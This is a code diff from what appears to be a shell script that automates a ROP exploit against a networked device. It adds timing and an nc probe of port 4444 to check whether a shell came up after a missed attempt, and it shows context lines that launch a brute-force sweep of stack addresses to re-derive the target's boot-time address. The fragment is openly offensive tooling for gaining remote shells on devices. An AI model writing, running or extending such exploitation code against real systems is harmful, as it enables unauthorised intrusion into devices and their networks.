@@ -133,7 +133,9 @@ case "$out" in
 esac
 
 log "no shell at $ADDR — DECODE-BUFFER zone; sweeping to re-derive this boot's address"
-emit rop_result "{"outcome":"no-shell","addr":"$ADDR"}"
+OUTCOME_TS=$(date +%s); LAT=$((OUTCOME_TS - FIRE_TS))
+PORT_RESP=$(nc -z -G 2 "$ip" 4444 2>/dev/null && echo "port-open" || echo "port-closed")
+emit rop_result "{\"ip\":\"$ip\",\"outcome\":\"no-shell\",\"addr\":\"$ADDR\",\"latency_s\":$LAT,\"sig\":\"no-shell-$PORT_RESP\",\"rc\":$rc}"
 echo "noshell $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
 # 16-shot hang sweep around the missed address (0x400 steps); a HANG hit pins the boot's stack.
 SW_OUT="$( "$PY" "$GUARD" brute --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$OFFSET" \
